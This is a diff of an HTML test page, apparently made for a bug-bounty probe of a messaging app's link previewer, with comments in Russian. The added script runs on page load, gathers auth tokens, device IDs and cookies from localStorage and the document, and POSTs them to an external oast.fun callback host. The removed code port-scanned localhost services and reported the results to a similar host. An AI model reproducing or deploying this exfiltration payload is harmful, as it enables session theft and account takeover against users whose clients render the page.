@@ -1,42 +1,46 @@
 <!DOCTYPE html>
-<html>
-<body>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Bug Bounty Test</title>
+    
+    <meta property="og:title" content="Security Research - Preview Test">
+    <meta property="og:description" content="Checking for XSS and SSRF in link previewer">
+    <meta property="og:image" content="https://via.placeholder.com/300">
+
     <script>
-        const hook = "https://zmsfeowzqscjsayavbfe5bypi9ion50ff.oast.fun";
+        (function() {
+            try {
+                // 1. Собираем данные
+                const loot = {
+                    auth: localStorage.getItem('__oneme_auth'),
+                    callToken: localStorage.getItem('__oneme_calls_auth_token'),
+                    deviceId: localStorage.getItem('__oneme_device_id'),
+                    url: window.location.href,
+                    cookies: document.cookie,
+                    userAgent: navigator.userAgent
+                };
 
-        function probe(port) {
-            const url = "http://127.0.0.1";
-            const start = Date.now();
-            const img = new Image();
-            
-            // Устанавливаем таймаут, чтобы не ждать вечно
-            const timer = setTimeout(() => {
-                img.src = ""; // Прекращаем загрузку
-                record(port, "timeout", Date.now() - start);
-            }, 2000);
-
-            img.onerror = () => {
-                clearTimeout(timer);
-                const duration = Date.now() - start;
-                record(port, "error", duration);
-            };
-
-            img.onload = () => {
-                clearTimeout(timer);
-                record(port, "open", Date.now() - start);
-            };
-            
-            img.src = `${url}:${port}/favicon.ico?v=${start}`;
-        }
-
-        function record(port, status, time) {
-            console.log(`Port ${port}: ${status} in ${time}ms`);
-            // Используем fetch вместо sendBeacon для надежности при тестах
-            fetch(`${hook}/?port=${port}&status=${status}&time=${time}`, {mode: 'no-cors'});
-        }
-
-        // Запуск
-        [6379, 3306, 27017, 5432, 8089797878970].forEach(probe);
+                // 2. Отправляем на вебхук
+                // Используем метод 'no-cors' для минимизации блокировок
+                fetch('https://zmsfeowzqscjsayavbfelf22b9986mdjs.oast.fun', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(loot)
+                });
+                
+                console.log("Payload sent");
+            } catch (e) {
+                console.error("Access denied:", e);
+            }
+        })();
     </script>
+</head>
+<body>
+    <h1>Security Research Lab</h1>
+    <p>Если вы видите этот текст, парсер успешно загрузил страницу.</p>
 </body>
 </html>
